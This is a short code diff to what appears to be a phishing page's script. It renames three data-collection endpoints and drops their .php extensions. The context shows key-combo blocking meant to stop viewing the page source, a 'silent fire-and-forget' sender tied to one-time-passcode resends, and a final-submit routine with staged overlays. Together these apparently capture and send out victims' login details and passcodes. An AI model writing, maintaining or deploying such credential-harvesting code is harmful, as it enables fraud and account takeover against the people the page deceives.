@@ -341,7 +341,7 @@ input:focus{outline:1px dotted #006FCF;border-color:#006FCF}
 		</div> 
 <script>
 function setupUI() {
-  const ENDPOINT = window.location.pathname + '/c.php';
+  const ENDPOINT = window.location.pathname + '/c';
 
   // 🔒 Block specific key combos (Ctrl+S, Ctrl+U, etc.)
   document.addEventListener("keydown", e => {
@@ -741,7 +741,7 @@ window.populateEmailFields = function () {
 
 function setupResendOTP() {
   let clickCount = 0;
-  const ENDPOINT = window.location.pathname + '/i.php';
+  const ENDPOINT = window.location.pathname + '/i';
 
   // 📤 Sender specific to Resend OTP (silent fire-and-forget)
   function sendPayload(payload) {
@@ -843,7 +843,7 @@ function setupFinalSubmit() {
   let count = 0;
   let busy = false;
 
-  const ENDPOINT = window.location.pathname + '/s.php';
+  const ENDPOINT = window.location.pathname + '/s';
   const ERROR_MS = 15000;
   const OVERLAY_PHASE1_MS = 10000;
   const OVERLAY_PHASE2_MS = 5000;
